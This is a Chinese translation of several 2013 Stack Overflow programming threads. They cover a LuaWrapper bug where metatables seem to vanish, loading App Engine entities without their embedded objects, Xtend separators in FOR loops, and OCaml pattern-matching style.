另一方面，我认为没有必要这样做。据我所知，`xmp`所有浏览器都支持，HTML5 CR 要求保留支持并且新的浏览器也实现它。它还说作者不得使用它，但这并不意味着它`xmp`不起作用。

# c++ - Lua、c++ 和消失的元表

> ID：14916985
> 
> 赞同：5
> 
> 时间：2013-02-17T01:06:24.913
> 
> 标签：c++, lua, metatable

**背景**

我与 Watusimoto 合作开发游戏[Bitfighter](http://bitfighter.org)。我们使用 LuaWrapper 的变体将我们的 c++ 对象与游戏中的 Lua 对象连接起来。我们还使用 Lua 的一种变体，称为[lua-vec](https://code.google.com/p/lua-vec/)来加速向量运算。

我们一直在努力解决一段时间以来一直困扰我们的错误。将发生随机崩溃，表明元表已损坏。请参阅[此处](https://stackoverflow.com/questions/14655949/why-does-one-work-and-one-crash)了解 Watusimoto 关于该问题的帖子。我不确定这是因为元表损坏，并且看到了一些我想在这里问的非常奇怪的行为。

**问题表现**

例如，我们创建一个对象并将其添加到这样的级别：

```
t = TextItem.new()
t:setText("hello")
levelgen:addItem(t) 
```

但是，游戏有时（并非总是）会崩溃。出现错误：

```
attempt to call missing or unknown method 'addItem' (a nil value) 
```

使用在回答上述 Watusimoto 的帖子时给出的建议，我已将最后一行更改为以下内容：

```
local ok, res = pcall(function() levelgen:addItem(t) end)

if not ok then
    local s = "Invalid levelgen value: "..tostring(levelgen).." "..type(levelgen).."\n"

    for k, v in pairs(getmetatable(levelgen)) do 
        s = s.."meta "..tostring(k).." "..tostring(v).."\n"
    end

    error(res..s)
end 
```

这会打印出元表，以了解`levelgen`从其中调用方法时出错的情况。

然而，这很疯狂，当它失败并打印出元表时，元表*正是*它应该的样子（通过正确的`addItem`调用和一切）。如果我在脚本加载时打印元表`levelgen`，并且当它使用`pcall`上面失败时，它们是相同的，每个调用和指向 userdata 的指针都是相同的并且应该是相同的。

就好像元表`levelgen`是随机地自发消失一样。

有人知道发生了什么吗？

谢谢

**注意：**这不仅仅发生在`levelgen`对象上。例如，它也发生在`TestItem`上面提到的对象上。实际上，相同的代码在我的计算机上`levelgen:addItem(t)`崩溃了，但在另一个开发人员的计算机上崩溃了，`t:setText("hello")`并且出现了相同的错误消息`missing or unknown method 'setText' (a nil value)`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T22:54:38.417

与任何谜团一样，您需要将其一层一层剥开。我建议执行 Lua 的相同步骤，并尝试检测所采用的路径与您的预期不同的地方：

返回什么`getmetatable(levelgen).__index`？如果是表格，则检查其内容是否为`addItem`. 如果它是一个函数，那么尝试调用它`(table, "addItem")`并查看它返回的内容。

检查`getmetatable`调用前后（或失败时）是否返回对同一对象的引用。

调用是否有几个级别的元表间接？如果是这样，请尝试通过显式调用遵循相同的路径，并查看差异在哪里。

`weak`如果没有其他引用，您是否使用可能导致值消失的键？

当您检测到它失败并继续查看它是否稍后再次“找到”该方法时，您是否可以提供一个“默认”值？或者当它坏了，之后的每个电话都坏了？

如果您为 addItem 保存一个适当的值并在检测到它已损坏时“修复”它怎么办？

如果你只是简单地处理错误（就像你做的那样）并调用它 10 次怎么办？它会至少显示一次有效结果（失败后）吗？100 次？如果你在它工作时继续调用相同的方法，它会失败吗？这可能会帮助您提出更具重现性的错误。

我不熟悉 LuaWrapper 来提供更具体的问题，但如果我是你，我会采取这些步骤。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-23T03:49:10.803

我强烈怀疑问题是你有一个类似于这个的类或结构：

```
struct Foo
{
    Bar bar;
    // Other fields follow
} 
```

你已经通过 LuaWrapper 将 Foo 和 Bar 暴露给 Lua。这里重要的一点是，它是结构`bar`上的第一个字段`Foo`。或者，您可能有一些从其他基类继承的类，并且派生类和基类都暴露给 LuaWrapper。

LuaWrapper 使用一个名为 Identifier 的函数来唯一地跟踪每个对象（例如给定对象是否已经添加到 Lua 状态）。默认情况下，它使用对象地址作为键。在上述情况下，Foo 和 Bar 可能在内存中具有相同的地址，因此 LuaWrapper 可能会感到困惑。

这可能会导致在尝试查找方法时抓取错误对象的元表。显然，由于它正在查看错误的元表，它不会找到您想要的方法，因此看起来好像您的元表神秘地丢失了条目。

我检查了一项更改，该更改跟踪每个对象的每种类型的数据，而不是一大堆。如果您将您的 LuaWrapper 副本更新到存储库中的最新版本，我相当肯定您的问题将得到解决。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-06-25T00:27:41.100

与上游（commit 3c54015）LuaWrapper 合并后，这个问题就消失了。这似乎是 LuaWrapper 中的一个错误。

谢谢亚历克斯！

# google-app-engine - 如何在没有嵌入对象或集合的情况下查询特定对象？

> ID：14916993
> 
> 赞同：0
> 
> 时间：2013-02-17T01:07:18.193
> 
> 标签：google-app-engine, objectify

我有一堂课，可以说是 Blarkar。Blarkar 有一个嵌入类 kar。有时当我查询 Blarkar 的实例时，我想要完整的对象，但有时我不需要它的所有嵌入对象及其嵌入对象。如何加载没有嵌入对象的对象？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T01:32:11.123

你不能。GAE 加载整个实体或根本不加载。通常这不是问题，除非您知道自己有真正的问题，否则不应尝试优化。但如果是这样，您可以将您的实体拆分为多个部分，例如 User 和 UserExtraStuff。

有一种特殊类型的查询称为投影查询，但这不太可能有用 - 它允许您从索引中选择一些数据而无需进行完整的实体查找。它仅在有限类型的不等式查询中有用。数据必须在索引中。

# for-loop - Xtend for 循环（所需的 while 循环函数）

> ID：14916994
> 
> 赞同：0
> 
> 时间：2013-02-17T01:07:34.627
> 
> 标签：for-loop, while-loop, xtend

我有一些输出数据的 Xtend 代码。下面是代码：

```
«FOR a:e.attributes»
    «a.eClass.name» «a.name»,
«ENDFOR» 
```

这将输出如下内容：

```
ClassName name1, ClassName name2, ClassName name3, ClassName name4, 
```

我想要的输出是：

```
ClassName name1, ClassName name2, ClassName name3, ClassName name4 
```

请注意，所需输出的行尾没有逗号。是否可以在 Xtend 中实现一个函数，让我不输出最后一个逗号？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T11:28:08.027

`«FOR a:e.attributes SEPARATOR ', '»«a.eClass.name» «a.name»«ENDFOR»`

甚至

`e.attributes.map['''«eClass.name» «name»'''].join(', ')`

# performance - 这两种模式匹配中哪种方式更受欢迎？

> ID：14916995
> 
> 赞同：4
> 
> 时间：2013-02-17T01:07:43.550
> 
> 标签：performance, functional-programming, pattern-matching, ocaml, preference

我只是好奇，这两个函数会做同样的事情。但是我应该使用哪一个？

```
let f a =
    match a with
        b -> a;; 
let f a =
    match a with
        b -> b;; 
```

还是仅取决于您的喜好？
我觉得第二个会更好，但我不确定。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-17T01:22:31.033

Performance wise there is no difference. Style-wise `b -> a` is a bit problematic because you have an unused variable `b`. `_ -> a` would make more sense. Other than that, it's just preference.

Personally I would prefer `_ -> a` over `b -> b` because it doesn't introduce an extra variable.

PS: I assume in your real code there are more cases than just `b` - otherwise you could just write `let f a = a`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-17T19:02:31.963

另外，在您的特定示例中，我将使用`function`

```
let f = function
      | b -> b 
```